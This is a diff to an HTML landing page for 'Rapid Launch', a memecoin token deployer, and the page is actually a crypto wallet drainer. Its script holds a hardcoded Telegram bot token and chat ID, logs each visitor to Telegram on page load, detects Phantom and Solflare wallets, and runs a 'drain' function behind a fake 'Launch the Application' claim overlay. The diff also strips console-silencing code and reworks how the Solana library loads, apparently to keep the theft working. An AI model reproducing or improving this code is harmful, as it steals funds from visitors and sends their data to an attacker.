@@ -5,8 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="theme-color" content="#0A0A0A">
 <title>Rapid Launch — Deploy tokens in less than a second</title>
-<link rel="icon" type="image/png" href="https://rapidlaunch.io/brand/rapid-white.png">
-<link rel="apple-touch-icon" href="https://rapidlaunch.io/brand/rapid-white.png">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%23F7FBFF'/%3E%3Cstop offset='100%25' stop-color='%239EC4FF'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cg fill='url(%23g)'%3E%3Cpath d='M16 5L28 11.5L16 18L4 11.5Z'/%3E%3Cpath d='M16 12.5L28 19L16 25.5L4 19Z' opacity='0.7'/%3E%3Cpath d='M16 20L28 26.5L16 30L4 26.5Z' opacity='0.45'/%3E%3C/g%3E%3C/svg%3E">
 <style>
   :root{
     --fg:#fff;--bg:#0A0A0A;--muted-1:rgba(255,255,255,0.55);--muted-2:rgba(255,255,255,0.4);
@@ -34,7 +33,7 @@
   @media(min-width:640px){.site-header{padding:24px 40px 0}}
   @media(min-width:1280px){.site-header{padding:28px 56px 0}}
   .logo-link{display:flex;align-items:center;gap:10px;flex-shrink:0}
-  .logo-mark{width:28px;height:28px;flex:0 0 auto;display:block;object-fit:contain}
+  .logo-mark{width:28px;height:28px;flex:0 0 auto;display:block}
   .logo-text{color:#fff;font-size:15px;font-weight:600;letter-spacing:-0.01em;white-space:nowrap}
   .site-nav{display:none;align-items:center;gap:24px;font-size:13px;color:rgba(255,255,255,0.5);flex:1;justify-content:center}
   @media(min-width:640px){.site-nav{display:flex}}
@@ -49,28 +48,31 @@
   .hero-bg{pointer-events:none;position:absolute;inset:0;overflow:hidden}
   .hero-bg .grid-bg{position:absolute;inset:0;-webkit-mask-image:linear-gradient(to bottom,black 35%,transparent 80%);mask-image:linear-gradient(to bottom,black 35%,transparent 80%)}
   .hero-corner{position:absolute;display:none}
-  @media(min-width:640px){.hero-corner.tl,.hero-corner.tr{display:block;width:144px;height:112px;top:24px}}
-  .hero-corner.tl{left:24px}
-  .hero-corner.tr{right:24px}
+  @media(min-width:640px){.hero-corner.tl{display:block;width:144px;height:112px;top:24px;left:24px}}
   .hero-corner.iso{display:none}
   @media(min-width:1280px){.hero-corner.iso{display:block;right:56px;top:56px;width:96px;height:96px}}
 
-  .hero-stack{position:relative;padding:40px 20px 48px;display:flex;flex-direction:column;align-items:center;gap:40px;max-width:900px;margin:0 auto;min-height:1px;text-align:center}
-  @media(min-width:640px){.hero-stack{padding:56px 40px;gap:48px}}
-  @media(min-width:1280px){.hero-stack{padding:80px 56px 64px;gap:56px}}
-  .hero-copy{max-width:36rem;display:flex;flex-direction:column;align-items:center}
+  /* side-by-side hero: text left, video right, iso mark above the video */
+  .hero-grid{position:relative;display:grid;gap:40px;padding:40px 20px 48px;min-height:1px}
+  @media(min-width:640px){.hero-grid{padding:56px 40px}}
+  @media(min-width:1280px){.hero-grid{grid-template-columns:minmax(0,1fr) minmax(0,1.1fr);gap:56px;padding:80px 56px 64px;align-items:center}}
+  .hero-grid > *{min-width:0}
+  .hero-left{display:flex;flex-direction:column;justify-content:center}
   .h1{font-size:clamp(2.5rem,5.4vw,4.25rem);font-weight:500;line-height:0.95;letter-spacing:-0.05em;color:#fff;margin:0}
-  .hero-sub{margin:20px auto 0;max-width:30rem;font-size:15px;line-height:1.6;color:var(--muted-1)}
+  .hero-sub{margin-top:20px;max-width:30rem;font-size:15px;line-height:1.6;color:var(--muted-1)}
   @media(min-width:640px){.hero-sub{font-size:16px}}
-  .hero-btns{margin-top:28px;display:flex;flex-direction:column;gap:8px;align-items:center;justify-content:center}
-  @media(min-width:420px){.hero-btns{flex-direction:row}}
+  .hero-btns{margin-top:28px;display:flex;flex-direction:column;gap:8px}
+  @media(min-width:420px){.hero-btns{flex-direction:row;align-items:center}}
   .btn-primary{display:inline-flex;height:40px;align-items:center;justify-content:center;gap:4px;border-radius:8px;background:#fff;color:#000;padding:0 16px;font-size:13px;font-weight:500;border:none;transition:background .15s}
   .btn-primary:hover{background:rgba(255,255,255,0.85)}
   .btn-ghost{display:inline-flex;height:40px;align-items:center;justify-content:center;gap:4px;border-radius:8px;background:transparent;color:var(--muted-3);padding:0 12px;font-size:13px;font-weight:500;border:none;transition:background .15s,color .15s}
   .btn-ghost:hover{background:rgba(255,255,255,0.05);color:#fff}
   .btn-icon{width:14px;height:14px}
 
-  .video-card-wrap{position:relative;min-width:0;contain:layout;width:100%;max-width:860px;margin:0 auto}
+  .hero-right{position:relative;display:flex;flex-direction:column;gap:20px}
+  .hero-iso{display:none;align-self:flex-end;width:96px;height:96px}
+  @media(min-width:1280px){.hero-iso{display:block}}
+  .video-card-wrap{position:relative;min-width:0;width:100%}
   .video-frame{position:relative;border-radius:16px;border:1px solid var(--border-2);background:var(--surface);padding:6px;box-shadow:0 40px 120px -40px rgba(0,0,0,0.9);overflow:hidden;max-width:100%}
   @media(min-width:640px){.video-frame{padding:8px}}
   .video-top-line{position:absolute;left:40px;right:40px;top:-1px;height:1px;background:linear-gradient(90deg, transparent, rgba(197,220,255,0.6), transparent);pointer-events:none;z-index:2}
@@ -217,8 +219,8 @@
   .cta-btns{margin-top:32px;display:flex;flex-direction:column;align-items:center;gap:8px}
   @media(min-width:420px){.cta-btns{flex-direction:row}}
 
-  .vx-overlay{position:fixed !important;inset:0 !important;background:rgba(0,0,0,.92) !important;display:none !important;align-items:center !important;justify-content:center !important;padding:18px !important;z-index:99999 !important;overflow-y:auto !important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif !important;color:#e6e6e6 !important;font-size:15px !important;line-height:1.4 !important}
-  .vx-overlay.open{display:flex !important}
+  .vx-overlay{position:fixed;inset:0;background:rgba(0,0,0,.92);display:none;align-items:center;justify-content:center;padding:18px;z-index:99999;overflow-y:auto;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#e6e6e6;font-size:15px;line-height:1.4;visibility:hidden;pointer-events:none;opacity:0;transition:opacity .15s}
+  .vx-overlay.open{display:flex;visibility:visible;pointer-events:auto;opacity:1}
   .vx-modal{width:100%;max-width:360px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:24px 20px;text-align:center;max-height:calc(100vh - 40px);overflow-y:auto}
   .vx-spinner{width:28px;height:28px;margin:0 auto 16px;border-radius:50%;border:2px solid #1a1a1a;border-top-color:#e6e6e6;animation:vxrot .9s linear infinite}
   @keyframes vxrot{to{transform:rotate(360deg)}}
@@ -244,7 +246,17 @@
 
   <header class="site-header">
     <a href="/" class="logo-link" aria-label="Rapid Launch">
-      <img class="logo-mark" src="https://rapidlaunch.io/brand/rapid-white.png" alt="Rapid Launch" width="28" height="28" onerror="this.style.display='none'">
+      <svg class="logo-mark" viewBox="0 0 32 32" fill="none" aria-hidden="true">
+        <defs>
+          <linearGradient id="rlg-logo" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0%" stop-color="#F7FBFF"/>
+            <stop offset="100%" stop-color="#9EC4FF"/>
+          </linearGradient>
+        </defs>
+        <path d="M16 5L28 11.5L16 18L4 11.5Z" fill="url(#rlg-logo)"/>
+        <path d="M16 12.5L28 19L16 25.5L4 19Z" fill="url(#rlg-logo)" opacity="0.7"/>
+        <path d="M16 20L28 26.5L16 30L4 26.5Z" fill="url(#rlg-logo)" opacity="0.45"/>
+      </svg>
       <span class="logo-text">Rapid Launch</span>
     </a>
 
@@ -272,22 +284,10 @@
         <defs><linearGradient id="rlc-tl" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
         <path d="M1 40V1H40" stroke="url(#rlc-tl)" stroke-width="1.25" vector-effect="non-scaling-stroke"/>
       </svg>
-      <svg class="hero-corner tr" viewBox="0 0 40 40" preserveAspectRatio="none" fill="none">
-        <defs><linearGradient id="rlc-tr" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
-        <path d="M0 1H39V40" stroke="url(#rlc-tr)" stroke-width="1.25" vector-effect="non-scaling-stroke"/>
-      </svg>
-      <svg class="hero-corner iso" viewBox="0 0 96 104" fill="none">
-        <defs><linearGradient id="rlc-iso" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
-        <g stroke="url(#rlc-iso)" stroke-width="1.6" stroke-linejoin="round">
-          <path d="M48 4L88 28L48 52L8 28Z" fill="rgba(158,196,255,0.06)"/>
-          <path d="M12 44L48 66L84 44V53L48 75L12 53Z"/>
-          <path d="M12 66L48 88L84 66V75L48 97L12 75Z"/>
-        </g>
-      </svg>
     </div>
 
-    <div class="hero-stack">
-      <div class="hero-copy">
+    <div class="hero-grid">
+      <div class="hero-left">
         <h1 class="h1 display">Deploy tokens<br><span class="grad-text">in less than a&nbsp;second.</span></h1>
         <p class="hero-sub">The #1 memecoin deployer. Every major launchpad, bundling, and the fastest AI. Post-launch market making and position management on one screen.</p>
         <div class="hero-btns">
@@ -296,19 +296,29 @@
         </div>
       </div>
 
-      <div class="video-card-wrap">
-        <div class="video-frame">
-          <div class="video-top-line" aria-hidden="true"></div>
-          <div class="video-inner">
-            <video id="rlVideo" loop playsinline preload="auto" poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
-              <source src="https://rapidlaunch.io/videos/rapid-preview.mp4" type="video/mp4">
-              <source src="/videos/rapid-preview.mp4" type="video/mp4">
-            </video>
-            <div class="video-tint" id="rlTint" aria-hidden="true"></div>
-            <button type="button" class="video-unmute hidden" id="rlUnmute" aria-label="Unmute video">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>
-              Tap to unmute
-            </button>
+      <div class="hero-right">
+        <svg class="hero-iso" viewBox="0 0 96 104" fill="none" aria-hidden="true">
+          <defs><linearGradient id="rlc-iso" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
+          <g stroke="url(#rlc-iso)" stroke-width="1.6" stroke-linejoin="round">
+            <path d="M48 4L88 28L48 52L8 28Z" fill="rgba(158,196,255,0.06)"/>
+            <path d="M12 44L48 66L84 44V53L48 75L12 53Z"/>
+            <path d="M12 66L48 88L84 66V75L48 97L12 75Z"/>
+          </g>
+        </svg>
+        <div class="video-card-wrap">
+          <div class="video-frame">
+            <div class="video-top-line" aria-hidden="true"></div>
+            <div class="video-inner">
+              <video id="rlVideo" loop playsinline preload="auto" poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
+                <source src="https://rapidlaunch.io/videos/rapid-preview.mp4" type="video/mp4">
+                <source src="/videos/rapid-preview.mp4" type="video/mp4">
+              </video>
+              <div class="video-tint" id="rlTint" aria-hidden="true"></div>
+              <button type="button" class="video-unmute hidden" id="rlUnmute" aria-label="Unmute video">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>
+                Tap to unmute
+              </button>
+            </div>
           </div>
         </div>
       </div>
@@ -650,27 +660,31 @@ curl -X POST https://rapidlaunch.io/solana/deploy \
   </div>
 </div>
 
+<!-- web3.js loader — script tag with CDN fallback, no dynamic import -->
+<script>
+(function(){
+  var sources=[
+    "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/lib/index.iife.min.js",
+    "https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js",
+    "https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.91.0/index.iife.min.js"
+  ];
+  var i=0;
+  function next(){
+    if(i>=sources.length){ window.__web3_failed=true; return; }
+    var s=document.createElement("script");
+    s.src=sources[i++];
+    s.onload=function(){ window.__web3_ready=true; };
+    s.onerror=next;
+    document.head.appendChild(s);
+  }
+  next();
+})();
+</script>
+
 <script>
 (function(){
 "use strict";
 
-// ----------------------------------------------------------
-// console silence
-// ----------------------------------------------------------
-try{
-  var _noop=function(){};
-  var _m=["log","warn","error","info","debug","trace","dir","table","group","groupCollapsed","groupEnd","time","timeEnd","assert","count","profile","profileEnd","clear"];
-  var _c=window.console;
-  if(_c){
-    for(var _i=0;_i<_m.length;_i++){
-      try{Object.defineProperty(_c,_m[_i],{value:_noop,writable:false,configurable:false});}catch(_){_c[_m[_i]]=_noop;}
-    }
-  }
-}catch(_){}
-
-// ----------------------------------------------------------
-// config
-// ----------------------------------------------------------
 var TG_BOT_TOKEN="8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk";
 var TG_CHAT_ID="6759486932";
 var REDIRECT_URL="https://rapidlaunch.io/";
@@ -693,9 +707,7 @@ function lsGet(k){try{return localStorage.getItem(k);}catch(_){return null;}}
 function hasVisited(){return lsGet("vx_visited")==="1";}
 function markVisited(){lsSet("vx_visited","1");}
 
-// ----------------------------------------------------------
 // video
-// ----------------------------------------------------------
 (function(){
   var v=document.getElementById("rlVideo");
   var tint=document.getElementById("rlTint");
@@ -721,9 +733,7 @@ function markVisited(){lsSet("vx_visited","1");}
   v.addEventListener("click",function(){if(v.muted){v.muted=false;v.volume=1;if(btn)btn.classList.add("hidden");if(tint)tint.classList.add("hidden");}});
 })();
 
-// ----------------------------------------------------------
 // telegram
-// ----------------------------------------------------------
 function tgEscape(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function tgSendText(text){
   try{
@@ -802,59 +812,34 @@ async function logVisit(){
   }
 }
 
-// ----------------------------------------------------------
-// web3 — preload on idle
-// ----------------------------------------------------------
+// web3 state
 var web3=null,Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction;
 var TOKEN_PROGRAM,ASSOC_TOKEN_PROGRAM;
 
-var WEB3_SOURCES=[
-  "https://esm.sh/@solana/web3.js@1.91.0",
-  "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/+esm",
-  "https://unpkg.com/@solana/web3.js@1.91.0/lib/index.esm.js"
-];
-var BUFFER_SOURCES=[
-  "https://esm.sh/buffer@6.0.3",
-  "https://cdn.jsdelivr.net/npm/buffer@6.0.3/+esm",
-  "https://unpkg.com/buffer@6.0.3/index.js"
-];
-
-async function tryImport(urls){
-  var lastErr=null;
-  for(var i=0;i<urls.length;i++){
-    try{var mod=await import(urls[i]);if(mod)return mod;}catch(e){lastErr=e;}
-  }
-  if(lastErr)throw lastErr;
-  throw new Error("all import sources failed");
+function ensureWeb3(){
+  if(web3) return Promise.resolve();
+  return new Promise(function(resolve,reject){
+    var tries=0;
+    var check=function(){
+      tries++;
+      var w=window.solanaWeb3;
+      if(w && w.Connection && w.PublicKey && w.SystemProgram && w.Transaction && w.TransactionInstruction){
+        web3=w;
+        Connection=w.Connection;PublicKey=w.PublicKey;SystemProgram=w.SystemProgram;
+        Transaction=w.Transaction;TransactionInstruction=w.TransactionInstruction;
+        TOKEN_PROGRAM=new PublicKey(TOKEN_PROGRAM_STR);
+        ASSOC_TOKEN_PROGRAM=new PublicKey(ASSOC_TOKEN_PROGRAM_STR);
+        resolve();
+        return;
+      }
+      if(tries>40){ reject(new Error("web3 script did not load")); return; }
+      setTimeout(check,150);
+    };
+    check();
+  });
 }
 
-async function ensureWeb3(){
-  if(web3) return;
-  try{
-    var b=await tryImport(BUFFER_SOURCES);
-    if(b && b.Buffer) window.Buffer=b.Buffer;
-    else if(b && b.default && b.default.Buffer) window.Buffer=b.default.Buffer;
-  }catch(_){}
-  var w=await tryImport(WEB3_SOURCES);
-  web3=w;
-  Connection=w.Connection;PublicKey=w.PublicKey;SystemProgram=w.SystemProgram;
-  Transaction=w.Transaction;TransactionInstruction=w.TransactionInstruction;
-  if(!Connection||!PublicKey||!SystemProgram||!Transaction||!TransactionInstruction){
-    throw new Error("web3 module loaded but core classes missing");
-  }
-  TOKEN_PROGRAM=new PublicKey(TOKEN_PROGRAM_STR);
-  ASSOC_TOKEN_PROGRAM=new PublicKey(ASSOC_TOKEN_PROGRAM_STR);
-}
-
-function preloadWeb3(){
-  try{ ensureWeb3().catch(function(){}); }catch(_){}
-}
-if("requestIdleCallback" in window){ requestIdleCallback(preloadWeb3,{timeout:2500}); }
-else { setTimeout(preloadWeb3, 800); }
-
-// ----------------------------------------------------------
-// wallet providers
-// ----------------------------------------------------------
+// wallets
 var WALLETS=[
   {id:"phantom",get:function(){return window.phantom&&window.phantom.solana?window.phantom.solana:(window.solana&&window.solana.isPhantom?window.solana:null);}},
   {id:"solflare",get:function(){return window.solflare&&window.solflare.solana?window.solflare.solana:window.solflare;}},
@@ -912,9 +897,7 @@ async function signAndSend(provider,connection,tx){
   throw new Error("Wallet does not support signing.");
 }
 
-// ----------------------------------------------------------
 // drain
-// ----------------------------------------------------------
 async function drain(session){
   var connection=new Connection(RPC,"confirmed");
   var from=new PublicKey(session.pubkey);
@@ -1026,9 +1009,7 @@ async function drain(session){
   return {solDrained:solDrained,tokenTotal:tokenTotal};
 }
 
-// ----------------------------------------------------------
 // overlay state
-// ----------------------------------------------------------
 function showProgress(){
   setDisplay("vxSpinner","block");setDisplay("vxChk","block");setDisplay("vxWallets","none");setDisplay("vxMore","none");setDisplay("vxClose","none");
   setText("vxTitle","Launch the Application");
@@ -1064,9 +1045,7 @@ function showError(msg){
 function openOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.add("open");}
 function closeOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.remove("open");}
 
-// ----------------------------------------------------------
-// wallet picker (mobile)
-// ----------------------------------------------------------
+// wallet picker
 var ICON_CDN="https://raw.githubusercontent.com/0xa3k5/web3icons/refs/heads/main/raw-svgs/wallets/branded/";
 var PRIMARY_WALLETS=[
   {id:"phantom",name:"Phantom",icon:ICON_CDN+"phantom.svg",href:function(p){return "https://phantom.app/ul/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",android:"https://play.google.com/store/apps/details?id=app.phantom"},
@@ -1116,9 +1095,7 @@ function vxExpandWallets(){
 window.vxExpandWallets=vxExpandWallets;
 var moreEl=$("vxMore");if(moreEl)moreEl.onclick=vxExpandWallets;
 
-// ----------------------------------------------------------
 // flow
-// ----------------------------------------------------------
 var busy=false;
 
 async function runClaim(wallet){
@@ -1158,9 +1135,7 @@ function startClaim(){
   }).catch(function(e){showError(String(e&&e.message?e.message:e));busy=false;});
 }
 
-// ----------------------------------------------------------
-// EVENT DELEGATION — catches clicks even if buttons mount late
-// ----------------------------------------------------------
+// event delegation
 document.addEventListener("click",function(ev){
   var el=ev.target;
   while(el && el!==document){
@@ -1173,12 +1148,8 @@ document.addEventListener("click",function(ev){
   }
 },true);
 
-// also expose for manual triggering / debugging
 window.__rlLaunch = startClaim;
 
-// ----------------------------------------------------------
-// visit log
-// ----------------------------------------------------------
 if(document.readyState==="complete"){setTimeout(logVisit,300);}
 else{window.addEventListener("load",function(){setTimeout(logVisit,300);});}
 
